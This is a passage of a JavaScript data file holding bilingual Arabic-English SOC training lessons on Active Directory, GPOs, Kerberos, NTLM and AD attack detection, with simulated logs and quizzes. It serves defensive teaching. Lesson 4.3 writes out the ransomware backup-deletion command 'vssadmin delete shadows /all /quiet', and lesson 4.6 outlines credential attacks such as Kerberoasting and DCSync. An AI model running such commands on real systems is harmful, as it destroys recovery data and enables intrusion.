// Master Courses Data Repository - Level 2: Intermediate SOC Track
// Courses 4, 5, 6 - 24 Comprehensive Lessons
// BasharSec Academy - Master Curriculum

const level2Courses = [
  {
    id: "course-4",
    courseNumber: 4,
    level: "intermediate",
    levelNameAr: "المستوى الثاني: متوسط",
    levelNameEn: "Level 2: Intermediate",
    levelBadgeColor: "#06B6D4",
    titleAr: "بيئة الشركات والـ Active Directory من الصفر المطلق",
    titleEn: "Enterprise Active Directory Architecture & Attacks from Zero",
    summaryAr: "عصب البنية التحتية العالمية: ما هو الـ Active Directory؟ مكونات الـ Domain و Forest، سياسات المجموعة GPOs وكيف يستغلها الهكر لنشر الفدية، التشريح الكامل لبروتوكول Kerberos و NTLM، وأشهر هجمات الدليل النشط Kerberoasting و Pass-the-Hash و Golden Ticket.",
    summaryEn: "Enterprise backbone: Active Directory architecture, GPO abuse, Kerberos authentication deep dive, NTLM, and elite AD attack forensics (Kerberoasting, Pass-the-Hash, Golden Ticket).",
    icon: "🏢",
    duration: "7 ساعات تدريبية",
    lessonsCount: 6,
    badgeAr: "مختص حماية الدليل النشط",
    badgeEn: "Active Directory Defense Specialist",
    lessons: [
      {
        id: "lesson-4-1",
        courseId: "course-4",
        number: "4.1",
        titleAr: "ما هو الـ Active Directory؟ ولماذا تستخدمه 90% من شركات العالم؟",
        titleEn: "What is Active Directory? Business Purpose, Centralization & Identity Architecture",
        duration: "50 min",
        theoryAr: `
<h3>العمود الفقري لإدارة الشركات: الدليل النشط لشركة مايكروسوفت</h3>
<p class="lead">تخيل شركة بها 50,000 موظف و 60,000 جهاز حاسوب ومئات الطابعات والخوادم؛ كيف يمكن لمهندس تكنولوجيا المعلومات إنشاء حساب لكل موظف، أو تغيير كلمة سر، أو تحديد من يحق له الدخول لملفات المحاسبة؟ إذا تمت هذه العملية يدوياً على كل جهاز بمفرده فستحتاج لجيش من الموظفين!</p>

<h4>حل المعضلة: الإدارة المركزية الموحدة (Centralized Identity Management)</h4>
<p>أطلقت مايكروسوفت خدمة <strong>Active Directory Domain Services (AD DS)</strong> كقاعدة بيانات مركزية موحدة لكل كائنات المؤسسة (المستخدمين، الحواسيب، المجموعات، والصلاحيات). بمجرد إنشاء حساب الموظف في الـ Active Directory، يمكنه تسجيل الدخول من أي حاسوب في أي فرع للشركة حول العالم بنفس اسم المستخدم وكلمة السر، مع تطبيق نفس القيود والصلاحيات عليه بدقة متناهية.</p>

<div class="callout-info">
  <h4>💡 التشبيه الواقعي: جواز السفر الوطني والسفارات</h4>
  <p>يعمل الـ Active Directory مثل مصلحة الأحوال المدنية والجوازات المركزية: خادم الدومين (Domain Controller) هو السفارة الرسمية؛ عندما يقدم الموظف هويته وكلمة سره، يصدر له السيرفر تذاكر مرور معتمدة ومختومة تخول له الدخول للغرف والمكاتب المسموح له بها فقط في المؤسسة.</p>
</div>

<h4>لماذا يستهدف المخترقون الـ Active Directory كأولوية قصوى؟</h4>
<p>يعلم المهاجمون أن السيطرة على حاسوب موظف عادي لا تحقق لهم أهدافهم الكاملة؛ الهدف الأسمى لكل عصابة قرصنة هو <strong>السيطرة على خادم الـ Domain Controller</strong> أو سرقة حساب مدير الدومين (Domain Admin). بمجرد الوصول لذلك، يصبح المهاجم هو الآمر الناهي في المؤسسة: يستطيع قراءة كل الإيميلات، تشفير كل السيرفرات ببرمجيات الفدية بضغطة زر واحدة عبر سياسات الـ GPO، وحذف كل النسخ الاحتياطية!</p>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي استعلام الدليل النشط (AD Query Console)</span>
    <h4>استعراض معلومات النطاق والـ Domain Controller عبر سطر الأوامر</h4>
  </div>
  <p>تفحص استعلام معلومات الدومين بواسطة أوامر ويندوز القياسية:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> ad-ds-query</div>
    <pre class="terminal-code">C:\> net config workstation
Computer name                        \\FIN-PC-102
User name                            Ahmed.K
Workstation active on                NetbiosSmb (000000000000)
Software version                     Windows 11 Enterprise
Workstation domain                   CORP.LOCAL  <-- ACTIVE DIRECTORY DOMAIN
Logon domain                         CORP.LOCAL
Logon server                         \\DC-PRIMARY-01  <-- DOMAIN CONTROLLER</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('net config workstation', 'standalone-term-body'); app.showToast('تم استعلام بيانات الدومين', 'info');">استعلام بيانات الدومين: net config</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هو السبب الرئيسي الذي يجعل عصابات الفدية والاختراق المتقدم (APTs) تركز 90% من جهودها بعد اختراق أي جهاز على السيطرة على الـ Active Directory؟",
          questionEn: "Why do ransomware groups prioritize compromising Active Directory?",
          optionsAr: [
            "لأن السيطرة على الـ Active Directory تمنح المهاجم صلاحيات Domain Admin للتحكم في جميع أجهزة وسيرفرات الشركة وتوزيع الفدية عليها مركزياً دفعة واحدة",
            "لأن الـ Active Directory يتيح للمهاجمين تنزيل الأفلام بسرعة",
            "لأن الـ Active Directory مخصص لبيع المنتجات التجارية فقط",
            "لأن الـ Active Directory يلغي وجود المعالج في الحواسيب"
          ],
          optionsEn: [
            "Compromising AD grants Domain Admin privileges, allowing centralized enterprise-wide ransomware deployment across all endpoints",
            "Faster movie downloads",
            "E-commerce sales only",
            "Eliminates hardware CPUs"
          ],
          correctIndex: 0,
          explanationAr: "يوفر الـ Active Directory تحكماً مركزياً مطلقاً؛ فالسيطرة على خادم الـ Domain Controller تمنح المهاجم مفاتيح المؤسسة بالكامل وتمكنه من فرض أي تغيير أو تشفير جماعي خلال دقائق."
        }
      },
      {
        id: "lesson-4-2",
        courseId: "course-4",
        number: "4.2",
        titleAr: "مكونات الـ AD: شرح تفصيلي لـ (Domain, Tree, Forest, Domain Controller, Organizational Units OUs, Users, Computers, Groups)",
        titleEn: "Active Directory Building Blocks: Forests, Domains, Domain Controllers, OUs & Security Groups",
        duration: "55 min",
        theoryAr: `
<h3>هندسة الهيكل الإداري: من المستخدم الفرد إلى الغابة الشاملة</h3>
<p class="lead">يتكون الـ Active Directory من وحدات منطقية ووحدات فيزيائية مرتبة ترتيباً هرمياً صارماً. فهم هذه المكونات يتيح لمحلل الـ SOC تتبع تحركات المهاجمين عبر حدود الثقة (Trust Relationships).</p>

<h4>1. المكونات الهرمية المنطقية (Logical Structure)</h4>
<ul>
  <li><strong>المجال (Domain):</strong> الحدود الإدارية والأمنية الأساسية (مثل <code>corp.local</code>)؛ تشترك فيه الأجهزة في قاعدة بيانات ومستخدمين وسياسات أمان موحدة.</li>
  <li><strong>الشجرة (Tree):</strong> مجموعة من النطاقات التي تشترك في نفس مساحة الأسماء المتسلسلة (Contiguous Namespace)، مثل: <code>sales.corp.local</code> و <code>corp.local</code>.</li>
  <li><strong>الغابة (Forest):</strong> أعلى مستوى تنظيمي في الـ Active Directory؛ تجمع عدة أشجار بنطاقات أسماء مختلفة (مثل <code>companyA.com</code> و <code>companyB.com</code>) وتشترك جميعها في مخطط واحد (Schema) ودليل عالمي واحد (Global Catalog). حدود الغابة هي الحدود الأمنية النهائية (Security Boundary).</li>
  <li><strong>الوحدات التنظيمية (Organizational Units - OUs):</strong> حاويات إدارية داخل الدومين تُشبه المجلدات؛ تُستخدم لتقسيم المستخدمين والأجهزة حسب الأقسام (مثل: <code>OU=Finance</code>, <code>OU=IT</code>, <code>OU=HR</code>) لتسهيل تطبيق سياسات مخصصة (GPOs) عليها.</li>
</ul>

<h4>2. المكون الفيزيائي الأساسي: خادم الـ Domain Controller (DC)</h4>
<p>السيرفر المركزي الذي يشغل خدمة AD DS ويحفظ قاعدة بيانات <code>NTDS.dit</code> (التي تحتوي على كل كلمات السر والبيانات الحساسة). في الشركات الكبرى يوجد على الأقل خادمان أو أكثر من الـ DCs لضمان استمرار الخدمة وتزامن البيانات (Replication) بشكل لحظي.</p>

<h4>3. مجموعات الأمان ذات الامتيازات الفائقة (Privileged Security Groups)</h4>
<p>المجموعات التي يراقبها الـ SOC كصقور؛ أي إضافة مستخدم جديد لها تعتبر حالة طوارئ أمنية فورية (Event ID 4728 / 4732):</p>
<ul>
  <li><strong>Domain Admins:</strong> مدراء الدومين؛ السيطرة الكاملة على كل ما هو متصل بالدومين.</li>
  <li><strong>Enterprise Admins:</strong> مدراء الغابة؛ أعلى سلطة مطلقة في المؤسسة بأكملها.</li>
  <li><strong>Schema Admins:</strong> المسؤولون عن تعديل البنية الهيكلية لبيانات الدليل النشط.</li>
</ul>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي استعلام مجموعات الدومين الإدارية (Privileged Groups Hunter)</span>
    <h4>فحص أعضاء مجموعة Domain Admins لكشف الحسابات الخفية</h4>
  </div>
  <p>شاهد تنفيذ أمر استعراض أعضاء مجموعة مدراء الدومين:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> ad-group-auditor</div>
    <pre class="terminal-code">C:\> net group "Domain Admins" /domain
Group name     Domain Admins
Comment        Designated administrators of the domain
Members:
-------------------------------------------------------------------------------
Administrator            admin_sarah              backdoor_svc  <-- ROGUE ACCOUNT!
The command completed successfully.
[CRITICAL ALERT] Unauthorized account backdoor_svc detected inside Domain Admins group!</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('net group \"Domain Admins\" /domain', 'standalone-term-body'); app.showToast('تم فحص أعضاء مجموعة Domain Admins', 'info');">فحص مدراء الدومين: net group "Domain Admins"</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هو ملف قاعدة البيانات المركزي الحرج في نظام ويندوز سيرفر الذي يخزن جميع حسابات وكلمات مرور الدليل النشط (Active Directory Hashes)؟",
          questionEn: "What is the critical database file storing Active Directory credentials?",
          optionsAr: [
            "`NTDS.dit` (الموجود عادة في مسار C:\\Windows\\NTDS\\)",
            "`explorer.exe`",
            "`config.sys`",
            "`pagefile.sys`"
          ],
          optionsEn: [
            "NTDS.dit (located in C:\\Windows\\NTDS\\)",
            "explorer.exe",
            "config.sys",
            "pagefile.sys"
          ],
          correctIndex: 0,
          explanationAr: "ملف `NTDS.dit` هو التاج الذهبي في الـ Active Directory؛ يحتوي على قاعدة بيانات جميع المستخدمين والهاشات المشفرة، وتسعى عصابات الاختراق دائماً لاستخراجه أو سرقته عبر هجمات مثل DCSync و Volume Shadow Copy."
        }
      },
      {
        id: "lesson-4-3",
        courseId: "course-4",
        number: "4.3",
        titleAr: "سياسات المجموعة (Group Policy Objects - GPOs) وكيف تتحكم في آلاف الأجهزة (وكيف يستغلها الهكر لنشر الفدية)",
        titleEn: "Group Policy Objects (GPOs) Architecture & Ransomware Mass-Deployment Abuse",
        duration: "50 min",
        theoryAr: `
<h3>أداة الإدارة الجبارة وسلاح الدمار الشامل في أيدي المهاجمين</h3>
<p class="lead">تعد سياسات المجموعة (Group Policy Objects - GPOs) من أقوى ميزات بيئة ويندوز؛ تتيح لمدير النظام ضبط إعدادات آلاف الأجهزة دفعة واحدة من مكان واحد (مثل إجبار تعقيد كلمات المرور، منع منافذ الـ USB، أو تثبيت برنامج حماية تلقائياً عند الإقلاع).</p>

<h4>كيف يتم توزيع وتطبيق الـ GPO في الشبكة؟</h4>
<ul>
  <li>يقوم المسؤول بإنشاء السياسة وربطها إما على مستوى النطاق بالكامل (Domain Level) أو على مستوى وحدة تنظيمية محددة (OU Level).</li>
  <li>تُخزن ملفات التكوين والسكريبتات في مجلد المشاركة العام للـ Domain Controller المسمى <code>SYSVOL</code> (المتاح قراءته لجميع حواسيب الدومين).</li>
  <li>تقوم أجهزة المستخدمين بالاتصال الدوري بسيرفر الـ DC وتحديث سياساتها وتطبيق التغييرات تلقائياً كل 90 إلى 120 دقيقة (أو إجبارياً عبر أمر <code>gpupdate /force</code>).</li>
</ul>

<h4>كيف تستغل عصابات الفدية (Ransomware Gangs) سياسات الـ GPO؟</h4>
<p>عندما تنجح عصابة فدية (مثل LockBit أو BlackCat) في الاستيلاء على حساب Domain Admin، لا تذهب لتشفير الأجهزة واحداً تلو الآخر؛ بل تقوم بإنشاء <strong>GPO خبيثة (Malicious GPO)</strong> تفرض التالي على كل حاسوب في الشركة:</p>
<ol>
  <li>تعطيل برنامج الحماية Microsoft Defender والـ EDR في الريجستري فوراً.</li>
  <li>حذف النسخ الاحتياطية ونقاط استعادة النظام (Shadow Copies) بأمر <code>vssadmin delete shadows /all /quiet</code>.</li>
  <li>نسخ ملف برمجية الفدية التنفيذي وتشغيله فوراً على آلاف الأجهزة في نفس اللحظة!</li>
</ol>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي فحص سياسات الدومين المطبقة (GPO Audit Tool)</span>
    <h4>استعراض تقرير السياسات المطبقة على جهاز المستخدم عبر gpresult</h4>
  </div>
  <p>تفحص نتائج تشخيص سياسات المجموعة المطبقة على الجهاز:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> gpo-inspector</div>
    <pre class="terminal-code">C:\> gpresult /R
Applied Group Policy Objects:
-----------------------------
    Default Domain Policy
    Corporate-Password-Complexity-GPO
    SUSPICIOUS_TASK_RUNNER  <-- UNUSUAL RECENTLY CREATED GPO!
        Action: Installs C:\\Windows\\Temp\\updater.exe via Startup Script</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('gpresult /R', 'standalone-term-body'); app.showToast('تم استخراج تقرير سياسات المجموعة gpresult', 'info');">تشغيل أمر gpresult /R</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "كيف تستغل عصابات الفدية المتقدمة ميزة سياسات المجموعة (GPOs) في بيئة الدليل النشط؟",
          questionEn: "How do ransomware operators abuse GPOs in Active Directory?",
          optionsAr: [
            "لتعطيل برامج الحماية وتوزيع وتشغيل ملف الفدية الخبيث على آلاف أجهزة وسيرفرات الشركة في وقت متزامن وبضغطة زر واحدة",
            "لترقية سرعة كابلات الإنترنت في الشركة",
            "لتخفيض درجة حرارة المعالج",
            "لإرسال هدايا للموظفين عبر البريد العادي"
          ],
          optionsEn: [
            "To disable security defenses and simultaneously push and execute ransomware binaries across thousands of enterprise machines",
            "To speed up network cables",
            "To cool down CPUs",
            "To mail gifts to staff"
          ],
          correctIndex: 0,
          explanationAr: "تعتبر سياسات الـ GPO القناة الأكثر كفاءة وسرعة لتوزيع الأوامر الإدارية على نطاق واسع، وهو ما تستغله عصابات الفدية لتحويل البنية الإدارية للشركة إلى وسيلة تدمير شاملة."
        }
      },
      {
        id: "lesson-4-4",
        courseId: "course-4",
        number: "4.4",
        titleAr: "تشريح بروتوكول التوثيق Kerberos خطوة بخطوة (AS-REQ, AS-REP, TGT, TGS-REQ, TGS-REP, KDC, Krbtgt)",
        titleEn: "Kerberos Authentication Protocol Deep Dive: AS-REQ, AS-REP, TGT, TGS-REQ, TGS-REP & Krbtgt",
        duration: "55 min",
        theoryAr: `
<h3>حارس البوابة الإغريقي ذو الرؤوس الثلاثة: كيف تتم المصادقة الأكثر تعقيداً في العالم؟</h3>
<p class="lead">بروتوكول Kerberos (منفذ TCP/UDP 88) هو نظام المصادقة الافتراضي والأكثر أماناً في بيئة ويندوز منذ نظام Windows 2000. يعتمد على مفهوم "التذاكر الرقمية الموثوقة" (Tickets) حتى لا تضطر الأجهزة لإرسال كلمات مرور المستخدمين عبر الشبكة على الإطلاق.</p>

<h4>رؤوس كيربيروس الثلاثة (The Triad Components):</h4>
<ul>
  <li><strong>العميل (Client):</strong> المستخدم الذي يريد الوصول لخدمة ما.</li>
  <li><strong>خادم مركز توزيع المفاتيح (Key Distribution Center - KDC):</strong> يعمل داخل الـ Domain Controller ويتكون من خدمتين: خادم المصادقة (AS) وخادم منح التذاكر (TGS).</li>
  <li><strong>الخدمة الهدف (Target Service):</strong> الخادم الذي يقدم الخدمة (مثل خادم مشاركة الملفات SMB أو خادم SQL).</li>
</ul>

<h4>رحلة التوثيق في Kerberos خطوة بخطوة (The 6-Step Dance):</h4>
<ol>
  <li><strong>1. AS-REQ (طلب المصادقة):</strong> يرسل العميل طابعاً زمنياً مشفراً بكلمة سره للـ KDC ليثبت هويته (Pre-Authentication).</li>
  <li><strong>2. AS-REP (إصدار تذكرة الدخول العامة):</strong> يتحقق الـ KDC من صحة المستخدم، ويرد بإرسال <strong>تذكرة التذاكر (Ticket Granting Ticket - TGT)</strong>. هذه التذكرة مشفرة بكلمة سر الحساب السري الخاص بالدومين وهو حساب <code>krbtgt</code>! (لا يستطيع المستخدم فك تشفيرها).</li>
  <li><strong>3. TGS-REQ (طلب الوصول لخدمة محددة):</strong> يقدم المستخدم تذكرة الـ TGT للـ KDC ويطلب إذن الوصول لخادم معين (مثلاً: <code>MSSQLSvc/db01.corp.local</code>) عبر اسمه التعريفي المسجل بالدليل (SPN).</li>
  <li><strong>4. TGS-REP (إصدار تذكرة الخدمة):</strong> يتحقق الـ KDC من صلاحيات المستخدم، ثم يصدر له <strong>تذكرة الخدمة (Service Ticket)</strong> مشفرة بكلمة سر الحساب المشغل لتلك الخدمة.</li>
  <li><strong>5. AP-REQ (تقديم التذكرة للخادم الهدف):</strong> يقدم العميل تذكرة الخدمة مباشرة إلى خادم قاعدة البيانات أو خادم الملفات.</li>
  <li><strong>6. AP-REP (المصادقة الثنائية):</strong> يتحقق الخادم الهدف من صحة التذكرة بكلمة سره ويسمح للمستخدم بالدخول فوراً.</li>
</ol>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي استعراض تذاكر كيربيروس (Kerberos Ticket Viewer)</span>
    <h4>فحص تذاكر TGT وتذاكر الخدمات بواسطة أداة klist</h4>
  </div>
  <p>تفحص التذاكر المخزنة حالياً في ذاكرة جلسة المستخدم:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> klist-ticket-inspector</div>
    <pre class="terminal-code">C:\> klist
#0> Client: Ahmed.K @ CORP.LOCAL
    Server: krbtgt/CORP.LOCAL @ CORP.LOCAL  <-- [TGT TICKET]
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Flags: 0x40e10000 -> forwardable renewable pre_authent
#1> Client: Ahmed.K @ CORP.LOCAL
    Server: cifs/fileserver.corp.local @ CORP.LOCAL  <-- [SERVICE TICKET FOR SMB]
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('klist', 'standalone-term-body'); app.showToast('تم استعراض تذاكر كيربيروس في الذاكرة', 'info');">استعراض تذاكر كيربيروس: klist</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "بكلمة سر أي حساب يتم تشفير تذكرة التذاكر (TGT - Ticket Granting Ticket) في بروتوكول Kerberos لضمان عدم تزويرها من قبل المستخدمين؟",
          questionEn: "Whose password hash encrypts the Kerberos TGT ticket?",
          optionsAr: [
            "حساب الخدمة المركزي السري الخاص بالنطاق: `krbtgt`",
            "حساب المستخدم العادي نفسه",
            "حساب شركة مايكروسوفت في واشنطن",
            "لا يتم تشفيرها على الإطلاق"
          ],
          optionsEn: [
            "The domain secret service account: krbtgt",
            "The user account itself",
            "Microsoft corporate account",
            "It is not encrypted"
          ],
          correctIndex: 0,
          explanationAr: "تُشفر تذكرة الـ TGT حصراً بواسطة هاش كلمة مرور حساب `krbtgt`؛ ولذلك إذا استطاع المهاجم سرقة هاش هذا الحساب، يستطيع تزوير تذكرة TGT صالحة للأبد وهو ما يُعرف بهجوم التذكرة الذهبية (Golden Ticket Attack)!"
        }
      },
      {
        id: "lesson-4-5",
        courseId: "course-4",
        number: "4.5",
        titleAr: "تشريح بروتوكول NTLM (Challenge-Response) والفرق الأمني بينه وبين Kerberos",
        titleEn: "NTLM Protocol Anatomy (Challenge-Response) & Security Differences vs Kerberos",
        duration: "50 min",
        theoryAr: `
<h3>بروتوكول التوثيق القديم ونقاط الضعف الجوهرية</h3>
<p class="lead">قبل كيربيروس، كانت مايكروسوفت تعتمد على بروتوكول NTLM (NT LAN Manager). ورغم قدمه ونقاط ضعفه القاتلة، لا يزال نشطاً حتى اليوم في معظم الشركات لضمان التوافق مع الأنظمة القديمة (Legacy Systems)، مما يجعله هدفاً سهلاً وثغرة مفضلة للمهاجمين.</p>

<h4>آلية التحدي والاستجابة في NTLM (The 3-Step Handshake):</h4>
<ol>
  <li><strong>1. التفاوض (Negotiate):</strong> يرسل العميل رسالة للخادم يعلن فيها عن رغبته في تسجيل الدخول.</li>
  <li><strong>2. التحدي (Challenge):</strong> يرد الخادم بإرسال نص عشوائي يسمى "التحدي" (Challenge / Nonce) مكون من 8 بايتات (أو 16 بايت في NTLMv2).</li>
  <li><strong>3. الاستجابة (Response):</strong> يقوم العميل بتشفير ذلك التحدي باستخدام هاش كلمة سره (NTLM Hash) ويرسله للخادم. يتحقق الخادم (أو الـ DC) من مطابقة النتيجة؛ فإذا تطابقت سُمح للمستخدم بالدخول.</li>
</ol>

<h4>المقارنة الأمنية الحاسمة بين NTLM و Kerberos لمحلل الـ SOC:</h4>
<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>وجه المقارنة</th>
        <th>بروتوكول Kerberos (الحديث والآمن)</th>
        <th>بروتوكول NTLM (القديم والهش)</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>المصادقة المتبادلة (Mutual Auth)</strong></td>
        <td>نعم؛ يتأكد العميل من هوية الخادم ويتأكد الخادم من هوية العميل.</td>
        <td>لا؛ الخادم فقط يتحقق من العميل، مما يسمح بهجمات التخفي وسيرفرات التصيد.</td>
      </tr>
      <tr>
        <td><strong>استهلاك موارد الـ DC</strong></td>
        <td>منخفض؛ العميل يحصل على تذكرة ويقدمها للسيرفر دون إزعاج الـ DC.</td>
        <td>عالي؛ يحتاج الخادم لمراجعة الـ DC في كل طلب تسجيل دخول.</td>
      </tr>
      <tr>
        <td><strong>المناعة ضد هجمات Relay</strong></td>
        <td>منيع جداً؛ التذاكر مرتبطة باسم خدمة محدد (SPN) ومحمية بتشفير الجلسة.</td>
        <td>هش للغاية؛ عرضة لهجوم التمرير الشهير (NTLM Relay Attacks).</td>
      </tr>
      <tr>
        <td><strong>التشفير المستخدم</strong></td>
        <td>تشفير متطور وقوي: AES-128 و AES-256.</td>
        <td>تشفير ضعيف وقديم: خوارزمية MD4 غير الآمنة لتوليد الهاش.</td>
      </tr>
    </tbody>
  </table>
</div>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي فحص نوع المصادقة (Auth Protocol Identifier)</span>
    <h4>مراقبة نوع المصادقة في سجلات Event ID 4624</h4>
  </div>
  <p>تفحص حقل حزمة المصادقة (Authentication Package) لمعرفة هل استُخدم كيربيروس أم NTLM:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> auth-package-viewer</div>
    <pre class="terminal-code">Log Name: Security | Event ID: 4624 (Successful Logon)
Account Name: Administrator
Logon Type: 3 (Network Logon)
Authentication Package: NTLM  <-- LEGACY AUTHENTICATION USED!
LM Package: NTLM V2
Package Name (NTLM only): NTLM V2
[WARNING] NTLM authentication observed on sensitive Domain Controller interface!</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هو الضعف الأمني الخطير في بروتوكول NTLM الذي يجعله عرضة لهجمات التمرير (NTLM Relay Attacks) بالمقارنة مع Kerberos؟",
          questionEn: "What critical flaw makes NTLM vulnerable to Relay attacks?",
          optionsAr: [
            "غياب المصادقة المتبادلة (Lack of Mutual Authentication) وضعف التوقيع الرقمي للجلسة مما يسمح بالتقاط استجابة التحدي وتمريرها لخادم آخر",
            "لأن NTLM يعمل على كابلات الشاشة فقط",
            "لأن NTLM لا يدعم الحروف الأبجدية",
            "لأن NTLM يمسح ملفات الويندوز تلقائياً"
          ],
          optionsEn: [
            "Lack of mutual authentication and session signing, enabling attackers to intercept challenge-response and relay it to target services",
            "Only runs on monitor cables",
            "Does not support alphabetic characters",
            "Auto-deletes Windows files"
          ],
          correctIndex: 0,
          explanationAr: "في NTLM، لا يتحقق العميل من مصداقية السيرفر الذي يخاطبه، مما يسمح للمهاجم باعتراض استجابة المصادقة وتمريرها (Relay) إلى سيرفر آخر كخادم الملفات أو Exchange ليسجل دخوله باسم الضحية دون معرفة كلمة سره."
        }
      },
      {
        id: "lesson-4-6",
        courseId: "course-4",
        number: "4.6",
        titleAr: "أشهر هجمات الـ Active Directory وكيف نراها في الـ SOC: (Kerberoasting, AS-REP Roasting, Pass-the-Hash, Pass-the-Ticket, Golden/Silver Ticket, DCSync, BloodHound)",
        titleEn: "Top Active Directory Attacks & SOC Detection: Kerberoasting, AS-REP, Pass-the-Hash, Golden Ticket & DCSync",
        duration: "55 min",
        theoryAr: `
<h3>ترسانة اختراق الدليل النشط: كيف يسقط الدومين وكيف يكشفه محلل الـ SOC؟</h3>
<p class="lead">لا يخترق المهاجمون الـ Active Directory بالسحر، بل باستغلال آليات البروتوكولات المصممة فيه. هذا الدرس هو المرجع الميداني الأهم لكشف أخطر 6 هجمات دومين في سجلات الـ SIEM.</p>

<h4>1. هجوم Kerberoasting (طلب تذاكر الخدمات وكسرها خارجياً)</h4>
<p>يستغل المهاجم ميزة شرعية في كيربيروس تسمح لأي مستخدم عادي بطلب تذكرة خدمة (TGS Ticket) لأي حساب مسجل له اسم خدمة (SPN). يستلم المهاجم التذكرة المشفرة بكلمة سر حساب الخدمة، ثم يفرغها ويأخذها لجهازه الخاص لكسرها بسرعة بكرت الشاشة (GPU Brute-forcing) باستخدام أداة Hashcat دون إرسال أي طلبات إضافية للشبكة!</p>
<p><strong>علامة الكشف في الـ SOC:</strong> رصد الحدث <strong>Event ID 4769</strong> في سجلات الـ DC بنوع تشفير قديم وهش <code>0x17 (RC4)</code> لعدة خدمات في وقت وجيز.</p>

<h4>2. هجوم AS-REP Roasting (استغلال الحسابات التي لا تطلب مصادقة مسبقة)</h4>
<p>إذا تم تعطيل ميزة التحقق المسبق (Do not require Kerberos preauthentication) على حساب مستخدم، يستطيع المهاجم طلب تذكرة AS-REP مباشرة دون تقديم كلمة سر، ويحصل على جزء مشفر بكلمة سر الحساب لكسرها دون اتصال.</p>
<p><strong>علامة الكشف في الـ SOC:</strong> رصد الحدث <strong>Event ID 4768</strong> بنوع Pre-Auth Type يساوي <code>0</code>.</p>

<h4>3. هجوم تمرير الهاش (Pass-the-Hash - PtH) وتمرير التذكرة (Pass-the-Ticket)</h4>
<p>لا يحتاج المهاجم لمعرفة كلمة السر الصريحة للمستخدم؛ بل يكفيه استخراج الـ NTLM Hash من ذاكرة الجهاز المصاب (عبر أدوات مثل Mimikatz)، واستخدامه مباشرة للمصادقة على أجهزة أخرى عبر بروتوكول SMB/RPC.</p>
<p><strong>علامة الكشف في الـ SOC:</strong> رصد الحدث <strong>Event ID 4624</strong> بنوع الدخول <code>Logon Type 3</code> واستخدام حزمة مصادقة NTLM بين حواسيب موظفين لا يفترض أن تتصل ببعضها البعض، أو الحدث <strong>Event ID 4648</strong> (تسجيل دخول صريح باستخدام بيانات اعتماد بديلة).</p>

<h4>4. هجوم التذكرة الذهبية (Golden Ticket Attack)</h4>
<p>بمجرد سرقة هاش حساب <code>krbtgt</code>، يقوم المهاجم بتوليد تذكرة TGT مزورة ومختومة باسم أي مستخدم يختاره (حتى لو كان وهمياً!) وتعيين صلاحيات Domain Admin له مع صلاحية تظل لسنوات طويلة!</p>
<p><strong>علامة الكشف في الـ SOC:</strong> تذاكر TGS تصدر دون وجود طلب TGT أصلي سابق في السجلات، أو تذاكر تمتد صلاحيتها لأكثر من 10 ساعات الافتراضية.</p>

<h4>5. هجوم تزامن الدومين الكارثي (DCSync Attack)</h4>
<p>يستخدم المهاجم واجهات برمجة مايكروسوفت (MS-DRSR) ليتظاهر بأنه Domain Controller إضافي يطلب مزامنة وتكرار قاعدة البيانات، فيرسل له الـ DC الحقيقي كل كلمات السر وهاشات المؤسسة طواعية!</p>
<p><strong>علامة الكشف في الـ SOC:</strong> رصد أحداث الوصول للدليل النشط <strong>Event ID 4662</strong> مع طلب حقوق التكرار الخاصة <code>DS-Replication-Get-Changes-All</code> الصادرة من حاسوب ليس Domain Controller!</p>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي كشف هجوم Kerberoasting (SIEM Detection Lab)</span>
    <h4>تحليل حدث Event ID 4769 لكشف استخراج تذاكر TGS المشبوهة</h4>
  </div>
  <p>تفحص تفاصيل الحدث الأمني الملتقط على خادم الدومين:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> event-4769-viewer</div>
    <pre class="terminal-code">Event ID: 4769 | Log Name: Security | Task: Kerberos Service Ticket Operations
Account Name: jdoe@CORP.LOCAL  <-- ORDINARY USER
Service Name: MSSQLSvc/sql-prod01.corp.local:1433  <-- SERVICE ACCOUNT TARGETED
Ticket Options: 0x40810000
Ticket Encryption Type: 0x17 (RC4-HMAC)  <-- VULNERABLE WEAK RC4 CIPHER REQUESTED!
Failure Code: 0x0 (Success)
[CRITICAL ALERT] Potential Kerberoasting attack detected! RC4 ticket requested for sensitive SPN by low-privilege user.</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
